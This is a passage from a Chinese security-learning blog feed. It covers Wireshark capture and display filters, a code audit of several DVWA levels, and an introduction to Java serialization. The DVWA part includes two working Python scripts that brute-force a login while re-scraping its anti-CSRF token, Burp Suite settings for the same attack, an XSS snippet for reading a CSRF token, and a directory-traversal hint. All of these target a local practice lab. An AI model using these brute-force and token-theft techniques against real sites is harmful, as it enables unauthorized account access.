alt="image-20231129093140964"></p><p>数据包列表：橙色</p><blockquote><p>在这个窗口中，我们看到每个数据包的摘要行，默认情况下包括下面列出的字段。我们可以添加或删除列来更改显示的信息。 </p><ul><li>Number-到达Wireshark的数据包 时间-Unix时间格式 Source-源IP Destination-目标IP </li><li>Protocol-使用的协议（TCP、UDP、DNS、ECT。） </li><li>Information—有关数据包的信息。此字段可能会根据内部使用的协议类型而有所不同。例如，它将显示DNS数据包的查询类型。</li></ul></blockquote><p>数据包详细信息：蓝色 </p><blockquote><p>数据包详细信息窗口允许我们深入数据包，以更详细地检查协议。它将把它分解成我们所期望的块，遵循典型的OSI模型参考。将包分割成不同的封装层以进行检查。 请记住，Wireshark将以相反的顺序显示这种封装，在窗口顶部显示较低层的封装，在底部显示较高级别的封装。</p></blockquote><p>数据包字节数：绿色 </p><blockquote><p>“数据包字节”窗口允许我们查看ASCII或十六进制输出中的数据包内容。当我们从上面的窗口中选择一个字段时，它将在“数据包字节”窗口中突出显示，并向我们显示该位或字节在整个数据包中的位置。 这是验证我们在Details窗格中看到的内容是否准确以及Wireshark所做的解释是否与数据包输出匹配的好方法。 输出中的每一行都包含数据偏移量、十六个十六进制字节和十六个ASCII字节。不可打印的字节将替换为ASCII格式的句点。</p></blockquote><h3 id="fileter"><a href="#fileter" class="headerlink" title="fileter"></a>fileter</h3><table><thead><tr><th><strong>Capture Filters</strong></th><th><strong>Result</strong></th></tr></thead><tbody><tr><td>host x.x.x.x</td><td>Capture only traffic pertaining to a certain host</td></tr><tr><td>net x.x.x.x&#x2F;24</td><td>Capture traffic to or from a specific network (using slash notation to specify the mask)</td></tr><tr><td>src&#x2F;dst net x.x.x.x&#x2F;24</td><td>Using src or dst net will only capture traffic sourcing from the specified network or destined to the target network</td></tr><tr><td>port #</td><td>will filter out all traffic except the port you specify</td></tr><tr><td>not port #</td><td>will capture everything except the port specified</td></tr><tr><td>port # and #</td><td>AND will concatenate your specified ports</td></tr><tr><td>portrange x-x</td><td>portrange will grab traffic from all ports within the range only</td></tr><tr><td>ip &#x2F; ether &#x2F; tcp</td><td>These filters will only grab traffic from specified protocol headers.</td></tr><tr><td>broadcast &#x2F; multicast &#x2F; unicast</td><td>Grabs a specific type of traffic. one to one, one to many, or one to all.</td></tr></tbody></table><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202407110939351.png" alt="image-20231129095646892"></p><table><thead><tr><th><strong>Display Filters</strong></th><th><strong>Result</strong></th></tr></thead><tbody><tr><td>ip.addr &#x3D;&#x3D; x.x.x.x</td><td>Capture only traffic pertaining to a certain host. This is an OR statement.</td></tr><tr><td>ip.addr &#x3D;&#x3D; x.x.x.x&#x2F;24</td><td>Capture traffic pertaining to a specific network. This is an OR statement.</td></tr><tr><td>ip.src&#x2F;dst &#x3D;&#x3D; x.x.x.x</td><td>Capture traffic to or from a specific host</td></tr><tr><td>dns &#x2F; tcp &#x2F; ftp &#x2F; arp &#x2F; ip</td><td>filter traffic by a specific protocol. There are many more options.</td></tr><tr><td>tcp.port &#x3D;&#x3D; x</td><td>filter by a specific tcp port.</td></tr><tr><td>tcp.port &#x2F; udp.port !&#x3D; x</td><td>will capture everything except the port specified</td></tr><tr><td>and &#x2F; or &#x2F; not</td><td>AND will concatenate, OR will find either of two options, NOT will exclude your input option.</td></tr></tbody></table><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202407110939352.png" alt="image-20231129095938604"></p><blockquote><p>在使用捕获和显示过滤器时，请记住，我们指定的内容是从字面意义上获取的。例如，对端口80流量的过滤与对HTTP的过滤不同。将端口和协议想象成更像是指导方针，而不是严格的规则。端口可以绑定并用于不同的目的，而不是最初的目的。例如，HTTP过滤将查找协议使用的关键标记，如GET&#x2F;POST请求，并显示它们的结果。对端口80的过滤将显示通过该端口发送或接收的任何内容，而与传输协议无关。 在下一节中，我们将介绍Wireshark的一些更高级的功能。</p></blockquote><h2 id="从GUI提取文件"><a href="#从GUI提取文件" class="headerlink" title="从GUI提取文件"></a>从GUI提取文件</h2><h2 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://academy.hackthebox.com/module/81/section/963&quot;&gt;Intro to Network Traffic Analysis (hackthebox.com)&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&quot;基础介绍&quot;&gt;&lt;</summary>
      
    
    
    
    
    <category term="MISC" scheme="https://taninluv.github.io/tags/MISC/"/>
    
    <category term="NTA" scheme="https://taninluv.github.io/tags/NTA/"/>
    
    <category term="HTB" scheme="https://taninluv.github.io/tags/HTB/"/>
    
  </entry>
  
  <entry>
    <title>DVWA</title>
    <link href="https://taninluv.github.io/2023/11/28/DVWA/"/>
    <id>https://taninluv.github.io/2023/11/28/DVWA/</id>
    <published>2023-11-28T01:41:29.000Z</published>
    <updated>2023-11-29T03:26:17.859Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>都只尝试审计一下高难度，顺带练习一下代码审计工具,这里impassible难度是已经防御好的，high是高难度，我们主要关注这两个部分的源码</p><h1 id="Brute-Force"><a href="#Brute-Force" class="headerlink" title="Brute Force"></a>Brute Force</h1><p>暴力破解，感觉没什么好审的，还是看看源码：</p><blockquote><?phpif( isset( $_POST[ 'Login' ] ) ) {  // Check Anti-CSRF token  checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );  // Sanitise username input  $user = $_POST[ 'username' ];  $user = stripslashes( $user );  $user = mysql_real_escape_string( $user );  // Sanitise password input  $pass = $_POST[ 'password' ];  $pass = stripslashes( $pass );  $pass = mysql_real_escape_string( $pass );  $pass = md5( $pass );  // Default values  $total_failed_login = 3;  $lockout_time    = 15;  $account_locked   = false;  // Check the database (Check user information)  $data = $db->prepare( 'SELECT failed_login, last_login FROM users WHERE user = (:user) LIMIT 1;' );  $data->bindParam( ':user', $user, PDO::PARAM_STR );  $data->execute();  $row = $data->fetch();  // Check to see if the user has been locked out.  if( ( $data->rowCount() == 1 ) && ( $row[ 'failed_login' ] >= $total_failed_login ) )  {​    // User locked out.  Note, using this method would allow for user enumeration!​    //echo "<pre><br />This account has been locked due to too many incorrect logins.</pre>";​    // Calculate when the user would be allowed to login again​    $last_login = $row[ 'last_login' ];​    $last_login = strtotime( $last_login );​    $timeout   = strtotime( "{$last_login} +{$lockout_time} minutes" );​    $timenow   = strtotime( "now" );​    // Check to see if enough time has passed, if it hasn't locked the account​    if( $timenow > $timeout )​      $account_locked = true;  }  // Check the database (if username matches the password)  $data = $db->prepare( 'SELECT * FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;' );  $data->bindParam( ':user', $user, PDO::PARAM_STR);  $data->bindParam( ':password', $pass, PDO::PARAM_STR );  $data->execute();  $row = $data->fetch();  // If its a valid login...  if( ( $data->rowCount() == 1 ) && ( $account_locked == false ) ) {​    // Get users details​    $avatar    = $row[ 'avatar' ];​    $failed_login = $row[ 'failed_login' ];​    $last_login  = $row[ 'last_login' ];​    // Login successful​    echo "<p>Welcome to the password protected area <em>{$user}</em></p>";​    echo "<img src=\"{$avatar}\" />";​    // Had the account been locked out since last login?​    if( $failed_login >= $total_failed_login ) {​      echo "<p><em>Warning</em>: Someone might of been brute forcing your account.</p>";​      echo "<p>Number of login attempts: <em>{$failed_login}</em>.<br />Last login attempt was at: <em>${last_login}</em>.</p>";​    }​    // Reset bad login count​    $data = $db->prepare( 'UPDATE users SET failed_login = "0" WHERE user = (:user) LIMIT 1;' );​    $data->bindParam( ':user', $user, PDO::PARAM_STR );​    $data->execute();  }  else {​    // Login failed​    sleep( rand( 2, 4 ) );​    // Give the user some feedback​    echo "<pre><br />Username and/or password incorrect.<br /><br/>Alternative, the account has been locked because of too many failed logins.<br />If this is the case, <em>please try again in {$lockout_time} minutes</em>.</pre>";​    // Update bad login count​    $data = $db->prepare( 'UPDATE users SET failed_login = (failed_login + 1) WHERE user = (:user) LIMIT 1;' );​    $data->bindParam( ':user', $user, PDO::PARAM_STR );​    $data->execute();  }  // Set the last login time  $data = $db->prepare( 'UPDATE users SET last_login = now() WHERE user = (:user) LIMIT 1;' );  $data->bindParam( ':user', $user, PDO::PARAM_STR );  $data->execute();}// Generate Anti-CSRF tokengenerateSessionToken();?></blockquote><h2 id="mysql-real-escape-string"><a href="#mysql-real-escape-string" class="headerlink" title="mysql_real_escape_string"></a>mysql_real_escape_string</h2><p><a href="https://www.w3school.com.cn/php/func_mysql_real_escape_string.asp">PHP mysql_real_escape_string() 函数 (w3school.com.cn)</a></p><blockquote><p>mysql_real_escape_string() 函数转义 SQL 语句中使用的字符串中的特殊字符。</p><p>下列字符受影响：</p><ul><li>\x00</li><li>\n</li><li>\r</li><li>\</li><li>‘</li><li>“</li><li>\x1a</li></ul><p>如果成功，则该函数返回被转义的字符串。如果失败，则返回 false。</p></blockquote><h2 id="stripslashes"><a href="#stripslashes" class="headerlink" title="stripslashes"></a>stripslashes</h2><p><a href="https://www.w3school.com.cn/php/func_string_stripslashes.asp">PHP stripslashes() 函数 (w3school.com.cn)</a></p><p>删除反斜杠</p><h2 id="PDO"><a href="#PDO" class="headerlink" title="PDO"></a>PDO</h2><p><a href="https://www.runoob.com/php/php-pdo.html">PHP PDO | 菜鸟教程 (runoob.com)</a></p><p>PHP 数据对象 （PDO） 扩展为PHP访问数据库定义了一个轻量级的一致接口。</p><p>PDO 提供了一个数据访问抽象层，这意味着，不管使用哪种数据库，都可以用相同的函数（方法）来查询和获取数据</p><h2 id="fetch"><a href="#fetch" class="headerlink" title="fetch()"></a>fetch()</h2><p><a href="https://blog.csdn.net/weixin_43742708/article/details/106027375">PHP预处理语句- fetch方法、fetchAll方法、fetchColumn方法、fetch_style属性_fetch php-CSDN博客</a></p><h2 id="占位符"><a href="#占位符" class="headerlink" title="占位符"></a>占位符</h2><blockquote><p>在这个例子中，<code>(:user)</code> 将被数据库的预处理机制所识别。它表示一个占位符，表示在执行该预处理语句时，会将真正的值绑定到该占位符位置。</p><p>预处理语句中的占位符通常使用问号 <code>?</code> 或命名占位符，例如 <code>:user</code>。这些占位符允许程序在执行 SQL 语句之前，将实际的值绑定到占位符位置，避免了直接在 SQL 查询中嵌入变量值，从而提高了安全性和效率。</p><p>在这个例子中，<code>(:user)</code> 可能代表一个命名占位符，表示在执行预处理语句时，将会把真正的用户名绑定到这个占位符位置。在实际执行查询之前，程序会通过绑定操作将实际的值填充到占位符中。</p></blockquote><h2 id="简单审计"><a href="#简单审计" class="headerlink" title="简单审计"></a>简单审计</h2><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311291126585.png" alt="image-20231128142725575"></p><p>这里先对token进行检测，防止csrf攻击，这里我们抓一个包看看：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311291126586.png" alt="image-20231128143308585"></p><p>他应该是把session和user token有一个绑定以防止csrf</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311291126587.png" alt="image-20231128144047550"></p><p>这里添加了PDO防护，sql注入应该用不了</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311291126588.png" alt="image-20231128144446252"></p><p>这里如果登录失败三次会被锁住15分钟</p><p>其他的话就是登陆成功和不成功，sql加了pdo，注不了，只能慢慢爆破</p><h3 id="high"><a href="#high" class="headerlink" title="high:"></a>high:</h3><p>这里爆破的话：</p><p><a href="https://blog.csdn.net/weixin_39934520/article/details/108755709">DVWA通过教程之暴力破解Brute Force_op&#x3D;login&amp;username&#x3D;admin%7cpwd&amp;password&#x3D; 攻击-CSDN博客</a></p><p>可以跟着做一遍，对bp的爆破模式使用加深一下</p><blockquote><p><strong>由于使用了Anti-CSRF token，每次服务器返回的登陆页面中都会包含一个随机的user_token的值，用户每次登录时都要将user_token一起提交。服务器收到请求后，会优先做token的检查，再进行sql查询。所以，不建议利用burpsuite进行无脑式的爆破了。</strong></p></blockquote><p><em><strong>*Python2.x代码*</strong></em></p><pre><code class="python">from bs4 import BeautifulSoupimport urllib2header=&#123;&#39;Host&#39;:&#39;127.0.0.1&#39;,        &#39;User-Agent&#39;:&#39;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0&#39;,        &#39;Accept&#39;:&#39;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#39;,        &#39;Accept-Language&#39;:&#39;zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3&#39;,        &#39;Referer&#39;:&#39;http://127.0.0.1/vulnerabilities/brute/&#39;,        &#39;cookie&#39;:&#39;PHPSESSID=6oqhn9tsrs80rbf3h4cvjutnn6; security=high&#39;,        &#39;Connection&#39;:&#39;close&#39;,        &#39;Upgrade-Insecure-Requests&#39;:&#39;1&#39;        &#125;requrl=&quot;http://127.0.0.1/vulnerabilities/brute/&quot; def get_token(requrl,header):    req=urllib2.Request(url=requrl,headers=header)    response=urllib2.urlopen(req)    print response.getcode(),    the_page=response.read()    print len(the_page)    soup=BeautifulSoup(the_page,&quot;html.parser&quot;)   #将返回的html页面解析为一个BeautifulSoup对象    input=soup.form.select(&quot;input[type=&#39;hidden&#39;]&quot;)   #返回的是一个list列表    user_token=input[0][&#39;value&#39;]               #获取用户的token    return user_token user_token=get_token(requrl,header)i=0for line in open(&quot;E:\Password\mima.txt&quot;):    requrl=&quot;http://127.0.0.1/vulnerabilities/brute/?username=admin&amp;password=&quot;+line.strip()+&quot;&amp;Login=Login&amp;user_token=&quot;+user_token    i=i+1    print i , &#39;admin&#39; ,line.strip(),    user_token=get_token(requrl,header)    if(i==20):        break</code></pre><p><em><strong>*python3.x代码*</strong></em> </p><pre><code class="python">from bs4 import BeautifulSoupimport requests header=&#123;&#39;Host&#39;:&#39;127.0.0.1&#39;,        &#39;User-Agent&#39;:&#39;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0&#39;,        &#39;Accept&#39;:&#39;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#39;,        &#39;Accept-Language&#39;:&#39;zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3&#39;,        &#39;Referer&#39;:&#39;http://127.0.0.1/vulnerabilities/brute/&#39;,        &#39;cookie&#39;:&#39;PHPSESSID=8p4kb7jc1df431lo6qe249quv2; security=high&#39;,        &#39;Connection&#39;:&#39;close&#39;,        &#39;Upgrade-Insecure-Requests&#39;:&#39;1&#39;        &#125;requrl=&quot;http://127.0.0.1/vulnerabilities/brute/&quot; def get_token(requrl,header):    response=requests.get(url=requrl,headers=header)    print (response.status_code,len(response.content))    soup=BeautifulSoup(response.text,&quot;html.parser&quot;)    input=soup.form.select(&quot;input[type=&#39;hidden&#39;]&quot;)   #返回的是一个list列表    user_token=input[0][&#39;value&#39;]                   #获取用户的token    return user_token user_token=get_token(requrl,header)i=0for line in open(&quot;E:\Password\mima.txt&quot;):    requrl=&quot;http://127.0.0.1/vulnerabilities/brute/?username=admin&amp;password=&quot;+line.strip()+&quot;&amp;Login=Login&amp;user_token=&quot;+user_token    i=i+1    print (i , &#39;admin&#39; ,line.strip(),end=&quot;  &quot;)    user_token=get_token(requrl,header)    if(i==20):        break</code></pre><p>bp:</p><p><strong>设置两个参数 password和user_token为变量，攻击类型选择pitchfork，意思是草叉模式（Pitchfork ）——它可以使用多组Payload集合，在每一个不同的Payload标志位置上（最多20个），遍历所有的Payload，举例来说，如果有两个Payload标志位置，第一个Payload值为A和B，第二个Payload值为C和D，则发起攻击时，将共发起两次攻击，第一次使用的Payload分别为A和C，第二次使用的Payload分别为B和D。</strong></p><p><strong>设置参数，在option选项卡中将攻击线程thread设置为1，因为Recursive_Grep模式不支持多线程攻击，然后选择Grep-Extract，意思是用于提取响应消息中的有用信息，点击Add，如下图进行设置，最后将Redirections设置为Always</strong></p><p> <strong>写上value&#x3D;’ 点击刷新相应信息  服务器返回的token选中（即value后面，表示每次从响应中获取该值）</strong></p><p><strong>将这个token 值先记录下来</strong></p><p><strong>a5f168e741600adb87c761ac45d016dd</strong></p><p><strong>然后设置payload，设置第一个参数载入字典，第二个参数选择Recursive grep，然后将options中的token作为第一次请求的初始值。</strong></p><h4 id="坑："><a href="#坑：" class="headerlink" title="坑："></a>坑：</h4><blockquote><p>在设置好Grep-Extract后，需要重新抓一个包把最新的user token作为初始参数 ，不然Recursive_Grep的参数会抓不到</p></blockquote><h1 id="Command-Inject"><a href="#Command-Inject" class="headerlink" title="Command Inject"></a>Command Inject</h1><pre><code>&lt;?phpif( isset( $_POST[ &#39;Submit&#39; ]  ) ) &#123;    // Check Anti-CSRF token    checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; );    // Get input    $target = $_REQUEST[ &#39;ip&#39; ];    $target = stripslashes( $target );    // Split the IP into 4 octects    $octet = explode( &quot;.&quot;, $target );    // Check IF each octet is an integer    if( ( is_numeric( $octet[0] ) ) &amp;&amp; ( is_numeric( $octet[1] ) ) &amp;&amp; ( is_numeric( $octet[2] ) ) &amp;&amp; ( is_numeric( $octet[3] ) ) &amp;&amp; ( sizeof( $octet ) == 4 ) ) &#123;        // If all 4 octets are int&#39;s put the IP back together.        $target = $octet[0] . &#39;.&#39; . $octet[1] . &#39;.&#39; . $octet[2] . &#39;.&#39; . $octet[3];        // Determine OS and execute the ping command.        if( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) &#123;            // Windows            $cmd = shell_exec( &#39;ping  &#39; . $target );        &#125;        else &#123;            // *nix            $cmd = shell_exec( &#39;ping  -c 4 &#39; . $target );        &#125;        // Feedback for the end user        echo &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;;    &#125;    else &#123;        // Ops. Let the user name theres a mistake        echo &#39;&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;/pre&gt;&#39;;    &#125;&#125;// Generate Anti-CSRF tokengenerateSessionToken();?&gt; </code></pre><h2 id="explode"><a href="#explode" class="headerlink" title="explode()"></a>explode()</h2><p><a href="https://www.w3school.com.cn/php/func_string_explode.asp">PHP explode() 函数 (w3school.com.cn)</a></p><p>把字符串打散为数组：</p><pre><code>&lt;?php$str = &quot;Hello world. I love Shanghai!&quot;;print_r (explode(&quot; &quot;,$str));?&gt;</code></pre><h2 id="PHP-stristr-函数"><a href="#PHP-stristr-函数" class="headerlink" title="PHP stristr() 函数"></a>PHP stristr() 函数</h2><p>stristr() 函数搜索字符串在另一字符串中的第一次出现。</p><p><strong>注释：</strong>该函数是二进制安全的。</p><p><strong>注释：</strong>该函数是不区分大小写的。如需进行区分大小写的搜索，请使用 <a href="https://www.w3school.com.cn/php/func_string_strstr.asp">strstr()</a> 函数。</p><p><a href="https://www.w3school.com.cn/php/func_string_stristr.asp">PHP stristr() 函数 (w3school.com.cn)</a></p><h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><pre><code>stristr(string,search,before_search)</code></pre><table><thead><tr><th align="left">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><em>string</em></td><td align="left">必需。规定被搜索的字符串。</td></tr><tr><td align="left"><em>search</em></td><td align="left">必需。规定要搜索的字符串。如果该参数是数字，则搜索匹配该数字对应的 ASCII 值的字符。</td></tr><tr><td align="left"><em>before_search</em></td><td align="left">可选。默认值为 “false” 的布尔值。如果设置为 “true”，它将返回 <em>search</em> 参数第一次出现之前的字符串部分。</td></tr></tbody></table><h2 id="php-uname"><a href="#php-uname" class="headerlink" title="php_uname"></a>php_uname</h2><p><a href="https://www.php.net/manual/zh/function.php-uname.php">PHP: php_uname - Manual</a></p><p>php_uname(string <code>$mode</code> &#x3D; “a”): string</p><pre><code>mode</code></pre><p><code>mode</code> 是单个字符，用于定义要返回什么信息：</p><ul><li><code>&#39;a&#39;</code>：此为默认。包含序列 <code>&quot;s n r v m&quot;</code> 里的所有模式。</li><li><code>&#39;s&#39;</code>：操作系统名称。例如： <code>FreeBSD</code>。</li><li><code>&#39;n&#39;</code>：主机名。例如： <code>localhost.example.com</code>。</li><li><code>&#39;r&#39;</code>：版本名称，例如： <code>5.1.2-RELEASE</code>。</li><li><code>&#39;v&#39;</code>：版本信息。操作系统之间有很大的不同。</li><li><code>&#39;m&#39;</code>：机器类型。例如：<code>i386</code>。</li></ul><h2 id="简单审计-1"><a href="#简单审计-1" class="headerlink" title="简单审计"></a>简单审计</h2><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311291126589.png" alt="image-20231128153521652"></p><p>这里先对输入的ip进行分段检测然后再拼贴</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311291126590.png" alt="image-20231128154222514"></p><p>使用加工后的ip执行ping，这里ip必须为数字并且长度只能为4段，限制得很死</p><h3 id="high-1"><a href="#high-1" class="headerlink" title="high"></a>high</h3><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311291126591.png" alt="image-20231128155233024"></p><p>这里进行了一个黑名单过滤，但是黑名单有了一些意义不明的空格~</p><p>其实能用的方法基本上都被过滤了，剩下的可能是一些异或等方法了</p><p><a href="https://blog.csdn.net/qq_61778128/article/details/127063407">无数字字母rce总结（取反、异或、自增、临时文件）_MUNG东隅的博客-CSDN博客</a></p><p>好像还是不行hh~</p><h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><p>csrf主要是前端的问题，简单审计一下</p><h2 id="high-2"><a href="#high-2" class="headerlink" title="high"></a>high</h2><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311291126592.png" alt="image-20231128160129804"></p><p>这里注入点被md5编码了，那么应该也无法使用报错注入。。</p><p>回到漏洞本身，我们通常使用的csrf检测手段是删除referer，如果请求依然成功判定为存在csrf漏洞，csrf token的防御是在每个会话上加一个token确保会话和用户身份的绑定，我们再看一眼中等难度，他没有使用csrf token，所以我们随便制作一个链接就可以进行csrf攻击，而这里可能需要借助一些xss来获取其他用户的token</p><p>这里补充一下：frames[0].document.getElementsByName(‘user_token’)使读取cookie的xsspayload</p><blockquote><p>frames[0].document.getElementsByName(‘user_token’)<br>在前端开发中，<code>frames</code> 是一个 JavaScript 对象，表示当前窗口或文档中包含的所有 <code>&lt;frame&gt;</code> 或 <code>&lt;iframe&gt;</code> 元素的集合。它提供了对嵌套框架（即内嵌页面）的访问和控制。</p><p>在这种情况下，<code>frames[0]</code> 表示当前文档中第一个 frame 或 iframe 元素，<code>.document</code> 属性用于访问该 frame 或 iframe 的文档对象，<code>getElementsByName(&#39;user_token&#39;)</code> 则是在该文档中根据名称获取元素的方法。</p></blockquote><h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311291126593.png" alt="image-20231128162032027"></p><h3 id="fnmatch"><a href="#fnmatch" class="headerlink" title="fnmatch()"></a>fnmatch()</h3><p><a href="https://www.w3school.com.cn/php/func_filesystem_fnmatch.asp">PHP fnmatch() 函数 (w3school.com.cn)</a></p><p>fnmatch() 函数根据指定的模式来匹配文件名或字符串。</p><h3 id="语法-1"><a href="#语法-1" class="headerlink" title="语法"></a>语法</h3><pre><code>fnmatch(pattern,string,flags)</code></pre><table><thead><tr><th align="left">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><em>pattern</em></td><td align="left">必需。规定要检索的模式。</td></tr><tr><td align="left"><em>string</em></td><td align="left">必需。规定要检查的字符串或文件。</td></tr><tr><td align="left"><em>flags</em></td><td align="left">可选。</td></tr></tbody></table><h3 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h3><p>此函数对于文件名尤其有用，但也可以用于普通的字符串。普通用户可能习惯于 shell 模式或者至少其中最简单的形式 ‘?’ 和 ‘*’ 通配符，因此使用 fnmatch() 来代替 ereg() 或者 preg_match() 来进行前端搜索表达式输入对于非程序员用户更加方便。</p><p>这道题的话写个file就可以进行目录穿越了：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311291126594.png" alt="image-20231128193808682"></p><p>直接file协议读取也可以。</p><p>先写到这里，等考完之后再写</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;都只尝试审计一下高难度，顺带练习一下代码审计工具,这里impassible难度是已经防御好的，high是高难度，我们主要关注这两个部分的源码</summary>
      
    
    
    
    
    <category term="代码审计" scheme="https://taninluv.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>java反序列化前瞻</title>
    <link href="https://taninluv.github.io/2023/11/27/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%89%8D%E7%9E%BB/"/>
    <id>https://taninluv.github.io/2023/11/27/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%89%8D%E7%9E%BB/</id>
    <published>2023-11-27T02:06:38.000Z</published>
    <updated>2023-11-27T08:59:04.575Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>给java反序列化上个引子，顺带把webgoat代码审计结束了</p><p>本来要开始学链子了，但是网警和技侦要开始考试了，打算突击一下ctf和代码审计，下个月在正式学习java反序列化</p><p><a href="https://www.runoob.com/java/java-files-io.html">Java 流(Stream)、文件(File)和IO | 菜鸟教程 (runoob.com)</a></p><h1 id="序列化和反序列化"><a href="#序列化和反序列化" class="headerlink" title="序列化和反序列化"></a>序列化和反序列化</h1><blockquote><p>Java 序列化是一种将对象转换为字节流的过程，以便可以将对象保存到磁盘上，将其传输到网络上，或者将其存储在内存中，以后再进行反序列化，将字节流重新转换为对象。</p><p>序列化在 Java 中是通过 <strong>java.io.Serializable</strong> 接口来实现的，该接口没有任何方法，只是一个标记接口，用于标识类可以被序列化。</p><p>当你序列化对象时，你把它包装成一个特殊文件，可以保存、传输或存储。反序列化则是打开这个文件，读取序列化的数据，然后将其还原为对象，以便在程序中使用。</p><p>序列化是一种用于保存、传输和还原对象的方法，它使得对象可以在不同的计算机之间移动和共享，这对于分布式系统、数据存储和跨平台通信非常有用。</p></blockquote><h1 id="Java-流-Stream-、文件-File-和IO"><a href="#Java-流-Stream-、文件-File-和IO" class="headerlink" title="Java 流(Stream)、文件(File)和IO"></a>Java 流(Stream)、文件(File)和IO</h1><blockquote><p>Java.io 包几乎包含了所有操作输入、输出需要的类。所有这些流类代表了输入源和输出目标。</p><p>Java.io 包中的流支持很多种格式，比如：基本类型、对象、本地化字符集等等。</p><p>一个流可以理解为一个数据的序列。输入流表示从一个源读取数据，输出流表示向一个目标写数据。</p><p>Java 为 I&#x2F;O 提供了强大的而灵活的支持，使其更广泛地应用到文件传输和网络编程中。</p></blockquote><p><img src="https://www.runoob.com/wp-content/uploads/2013/12/iostream2xx.png" alt="img"></p><h1 id="java-反射"><a href="#java-反射" class="headerlink" title="java 反射"></a>java 反射</h1><p><a href="https://www.w3cschool.cn/java/java-reflex.html">java反射机制深入理解剖析_w3cschool</a></p><blockquote><p>在java开发中有一个非常重要的概念就是java反射机制，也是java的重要特征之一。反射的概念是由Smith在1982年首次提出的，主要是指程序可以访问、检测和修改它本身状态或行为的一种能力，通过反射可以调用私有方法和私有属性，大部分框架也都是运用反射原理的。java通常是先有类再有对象，有对象就可以调用方法或者属性，java中的反射其实是通过Class对象来调用类里面的方法。掌握了反射的知识，才能更好的学习java高级课程。</p></blockquote><p>一个类有多个组成部分，例如:成员变量、方法、构造方法等，反射就是加载类,并解剖出类的各个组成部分。</p><p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20231127110009212.png" alt="image-20231127110009212"></p><h1 id="序列化过程简单演示"><a href="#序列化过程简单演示" class="headerlink" title="序列化过程简单演示"></a>序列化过程简单演示</h1><p>先创建一个类Person.java</p><pre><code>package test;import java.io.Serializable;public class Person implements Serializable &#123;    private String username;    public int age;    public Person(String username, int age) &#123;        this.username = username;        this.age = age;    &#125;    @Override    public String toString() &#123;        return &quot;person&#123;&quot; +                &quot;username=&#39;&quot; + username + &#39;\&#39;&#39; +                &quot;, age=&quot; + age +                &#39;&#125;&#39;;    &#125;&#125;</code></pre><p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20231127151420206.png" alt="image-20231127151420206"></p><h2 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h2><p>序列化文件 SerializationTest.java</p><pre><code>package test;import java.io.FileOutputStream;import java.io.IOException;import java.io.ObjectOutputStream;public class SerializationTest &#123;    public static void serialize(Object object) throws IOException&#123;        ObjectOutputStream objectOutputStream=new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));        objectOutputStream.writeObject(object);    &#125;    public static void main(String[] args) throws Exception&#123;        Person person = new Person(&quot;water3&quot;,23);        serialize(person);        System.out.println(&quot;serialize:&quot;+person);    &#125;&#125;</code></pre><p><strong>序列化对象：</strong> 使用 ObjectOutputStream 类来将对象序列化为字节流</p><p>这里新创建了一个FileOutputStream类来接受序列化对象，该类用来创建一个文件并向文件中写数据。</p><p>如果该流在打开文件进行输出前，目标文件不存在，那么该流会创建该文件。</p><p>有两个构造方法可以用来创建 FileOutputStream 对象。</p><p>使用字符串类型的文件名来创建一个输出流对象：</p><pre><code>OutputStream f = new 